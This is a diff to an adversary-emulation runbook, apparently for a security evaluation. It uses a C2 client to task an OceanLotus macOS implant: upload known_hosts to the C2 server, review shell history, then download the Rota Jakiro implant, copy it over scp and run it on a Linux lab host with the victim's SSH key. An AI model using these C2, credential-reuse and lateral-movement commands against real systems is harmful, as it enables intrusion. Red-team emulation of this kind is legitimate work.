@@ -330,11 +330,6 @@ Search for local credentials on the macOS host and use t
    
    Expected Output:
    ```
-   [SUCCESS] 2023/08/18 18:20:13 Successfully set task for session: b6dbd70f203515095d0ca8a5ecbb43f7
-   [INFO] 2023/08/18 18:20:22 Received beacon from existing implant b6dbd70f203515095d0ca8a5ecbb43f7.
-   [INFO] 2023/08/18 18:20:22 New task received for UUID:  b6dbd70f203515095d0ca8a5ecbb43f7
-   [INFO] 2023/08/18 18:20:22 Sending new task to implant: b6dbd70f203515095d0ca8a5ecbb43f7
-   [INFO] 2023/08/18 18:20:22 Received beacon from existing implant b6dbd70f203515095d0ca8a5ecbb43f7.
    [INFO] 2023/08/18 18:20:22 Received task output for session:  b6dbd70f203515095d0ca8a5ecbb43f7
    [Task] 2023/08/18 18:20:22 total 24
    drwx------   5 hpotter  VISERION\Domain Users   160 Aug  4 19:09 .
@@ -352,12 +347,6 @@ Search for local credentials on the macOS host and use t
     ```
    Expected output:
    ```
-   [INFO] 2023/08/18 18:29:29 Received SetTaskBySessionId request
-   [SUCCESS] 2023/08/18 18:29:29 Successfully set task for session: b6dbd70f203515095d0ca8a5ecbb43f7
-   [INFO] 2023/08/18 18:29:30 Received beacon from existing implant b6dbd70f203515095d0ca8a5ecbb43f7.
-   [INFO] 2023/08/18 18:29:30 New task received for UUID:  b6dbd70f203515095d0ca8a5ecbb43f7
-   [INFO] 2023/08/18 18:29:30 Sending new task to implant: b6dbd70f203515095d0ca8a5ecbb43f7
-   [INFO] 2023/08/18 18:29:30 Received beacon from existing implant b6dbd70f203515095d0ca8a5ecbb43f7.
    [SUCCESS] 2023/08/18 18:29:30 File uploaded: Successfully uploaded file to control server at './files/known_hosts'
    ```
    
@@ -378,13 +367,8 @@ Search for local credentials on the macOS host and use t
 
    Expected output: 
    ```
-   [INFO] 2023/08/18 18:36:21 Received SetTaskBySessionId request
    [SUCCESS] 2023/08/18 18:36:21 Successfully set task for session: b6dbd70f203515095d0ca8a5ecbb43f7
-   [INFO] 2023/08/18 18:36:28 Received beacon from existing implant b6dbd70f203515095d0ca8a5ecbb43f7.
-   [INFO] 2023/08/18 18:36:28 New task received for UUID:  b6dbd70f203515095d0ca8a5ecbb43f7
-   Building task for instruction  OSX_run_cmd
-   [INFO] 2023/08/18 18:36:28 Sending new task to implant: b6dbd70f203515095d0ca8a5ecbb43f7
-   [INFO] 2023/08/18 18:36:28 Received beacon from existing implant b6dbd70f203515095d0ca8a5ecbb43f7.
+   ...
    [INFO] 2023/08/18 18:36:28 Received task output for session:  b6dbd70f203515095d0ca8a5ecbb43f7
    [Task] 2023/08/18 18:36:28 which git
    brew install iterm
@@ -393,7 +377,7 @@ Search for local credentials on the macOS host and use t
    ...
    ```
    
-   Reviewing the history file, we see the user scp commands to the specified IP address. 
+   Reviewing the history file, we see the user uses scp commands to a specified IP address. 
 
 ### 🔮 Reference Code & Reporting
 <details>
@@ -430,16 +414,29 @@ Execute Rota Jakiro
    ```
    ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_download_file", "payload":"rota"}'
    ```
+   Expected Output:
+   ```
+   [INFO] 2023/08/24 18:53:21 Fetching requested file for task:  rota
+   [INFO] 2023/08/24 18:53:21 Sending new task to implant: b6dbd70f203515095d0ca8a5ecbb43f7
+   ```
 
    Verify the file downloaded
    ```
    ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /Users/hpotter/Library/WebKit/osx.download"}'
    ```
+   Exepcted Output:
+   ```
+   Received task output for session:  b6dbd70f203515095d0ca8a5ecbb43f7
+   [Task] 2023/08/24 18:54:55 -rw-r--r--  1 hpotter  VISERION\Domain Users  30856 Aug 24 18:53 /Users/hpotter/Library/WebKit/osx.download
+   
+   [SUCCESS] 2023/08/24 18:54:55 Successfully set task output.
+   ```
    💡 All files are downloaded to the directory where the OSX implant binary is running, `/Users/hpotter/Library/WebKit`, as `osx.download`. `/Users/hpotter/Library/WebKit` is where the OSX implant binary is dropped from the application bundle.
+
    
 <details>
     <summary>Trouble Shooting</summary>
-      
+   ---
     On the C2 server start a simple HTTP server
 
     ```
@@ -464,22 +461,43 @@ Execute Rota Jakiro
     ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /tmp/rota"}'
     ```
     End Troubleshooting
+   
+   End troupble shooting
 
     ---
+    
 </details>
 
 1. Task OceanLotus to SCP the Rota Jakiro implant to the Linux host
    ```
    ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"scp -i /Users/hpotter/.ssh/id_rsa /tmp/rota hpotter@viserion.com@10.90.30.7:/tmp/rota"}'
    ```
+   Expected Output:
+   ```
+   [SUCCESS] 2023/08/24 18:57:42 Successfully set task for session: b6dbd70f203515095d0ca8a5ecbb43f7
+   ...
+   [Task] 2023/08/24 18:57:54
+   [SUCCESS] 2023/08/24 18:57:54 Successfully set task output.
+   ```
 1. Give Rota Jakiro executable permissions
    ```
    ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ssh -i /Users/hpotter/.ssh/id_rsa -t hpotter@viserion.com@10.90.30.7 \"chmod +x /tmp/rota\""}'
+   ```
+   Expected Output:
+   ```
+   [SUCCESS] 2023/08/24 18:58:40 Successfully set task for session: b6dbd70f203515095d0ca8a5ecbb43f7
+   ...
+   [Task] 2023/08/24 18:58:46
+   [SUCCESS] 2023/08/24 18:58:46 Successfully set task output.
    ```
    
 1. Use OceanLotus to Execute Rota Jakiro on the Lotus host using ssh
    ```
    ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ssh -i /Users/hpotter/.ssh/id_rsa -t hpotter@viserion.com@10.90.30.7 \"nohup /tmp/rota&2>/dev/null; sleep 5; pkill rota;rm nohup.out\""}'                                         
+   ```
+      Expected Output:
+   ```
+   [SUCCESS] 2023/08/24 18:59:35 Successfully set task for session: b6dbd70f203515095d0ca8a5ecbb43f7
    ```
 1. Confirm C2 Registration of Rota on the C2 Server
    Expected Output:
@@ -684,8 +702,13 @@ Rota Jakiro confirms the target file were created
    ```
    Expected Output:
    ```
-   [Task] 2023/08/21 19:46:47 exiting!
-   [SUCCESS] 2023/08/21 19:46:47 Successfully set task output.
+   [SUCCESS] 2023/08/24 19:01:18 Successfully set task for session: 01020304
+   ...
+   [INFO] 2023/08/24 19:01:18 Received task output for session:  01020304
+   [Task] 2023/08/24 19:01:18 exiting!
+   [SUCCESS] 2023/08/24 19:01:18 Successfully set task output.
+   [INFO] 2023/08/24 19:01:18 Received task output for session:  b6dbd70f203515095d0ca8a5ecbb43f7
+   [Task] 2023/08/24 19:01:18
    ```
 
 The End 💔
